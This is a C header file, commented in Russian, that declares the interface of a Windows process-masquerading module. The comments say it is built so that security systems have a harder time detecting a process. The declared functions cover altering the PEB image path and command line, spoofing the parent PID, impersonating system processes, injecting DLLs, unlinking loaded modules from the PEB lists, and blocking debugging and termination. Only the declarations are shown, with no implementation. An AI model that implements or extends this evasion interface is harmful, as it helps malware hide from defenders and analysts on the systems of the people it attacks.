/**
 * process_masquerading.h - Интерфейс модуля маскировки процессов
 * 
 * Данный файл описывает интерфейс модуля маскировки процессов,
 * который позволяет изменять видимые свойства процесса в системе Windows
 * для затруднения его обнаружения системами защиты.
 */

#ifndef PROCESS_MASQUERADING_H
#define PROCESS_MASQUERADING_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Инициализация модуля маскировки процессов
 * Сохраняет оригинальные данные процесса для возможности восстановления
 * 
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_Initialize(void);

/**
 * Очистка ресурсов модуля и восстановление оригинальных данных процесса
 */
void ProcessMasq_Cleanup(void);

/**
 * Модификация данных процесса в Process Environment Block (PEB)
 * Изменяет путь к образу и командную строку процесса в структурах PEB
 * 
 * @param newImagePathName Новый путь к образу процесса, NULL - не изменять
 * @param newCommandLine Новая командная строка, NULL - не изменять
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_ModifyPEB(const wchar_t* newImagePathName, const wchar_t* newCommandLine);

/**
 * Проверка возможности подмены родительского PID
 * 
 * @param targetParentPID ID процесса, который будет использоваться как родительский
 * @return TRUE если подмена возможна, FALSE при ошибке
 */
BOOL ProcessMasq_SpoofPPID(DWORD targetParentPID);

/**
 * Создание нового процесса с подменой родительского PID
 * 
 * @param targetParentPID ID процесса, который будет использоваться как родительский
 * @param commandLine Командная строка для нового процесса
 * @param bInheritHandles Флаг наследования дескрипторов
 * @param creationFlags Флаги создания процесса
 * @param pStartupInfo Указатель на структуру STARTUPINFOW
 * @param pProcessInfo Указатель на структуру PROCESS_INFORMATION для получения результата
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_CreateProcessWithSpoofedParent(
    DWORD targetParentPID,
    LPWSTR commandLine,
    BOOL bInheritHandles,
    DWORD creationFlags,
    LPSTARTUPINFOW pStartupInfo,
    LPPROCESS_INFORMATION pProcessInfo);

/**
 * Модификация атрибутов окна процесса
 * 
 * @param newWindowTitle Новый заголовок окна, NULL - не изменять
 * @param hideWindow Флаг скрытия окна (TRUE - скрыть, FALSE - не скрывать)
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_ModifyWindowAttributes(const wchar_t* newWindowTitle, BOOL hideWindow);

/**
 * Внедрение DLL в текущий процесс
 * 
 * @param dllPath Путь к DLL для загрузки
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_InjectDLL(const wchar_t* dllPath);

/**
 * Имитация системного процесса
 * Изменяет видимые атрибуты процесса так, чтобы он походил на системный
 * 
 * @param processName Имя системного процесса для имитации (без пути)
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_ImpersonateSystemProcess(const char* processName);

/**
 * Скрытие загруженного модуля из списка модулей процесса
 * Удаляет модуль из списков загруженных модулей в PEB, делая его невидимым для большинства средств анализа
 * 
 * @param dllNameToHide Имя DLL для скрытия (может быть частью имени)
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_HideLoadedModule(const wchar_t* dllNameToHide);

/**
 * Защита процесса от отладки и завершения
 * Применяет различные методы для защиты процесса от анализа и принудительного завершения
 * 
 * @return TRUE в случае успеха, FALSE при ошибке
 */
BOOL ProcessMasq_ProtectProcess(void);

#ifdef __cplusplus
}
#endif

#endif /* PROCESS_MASQUERADING_H */ 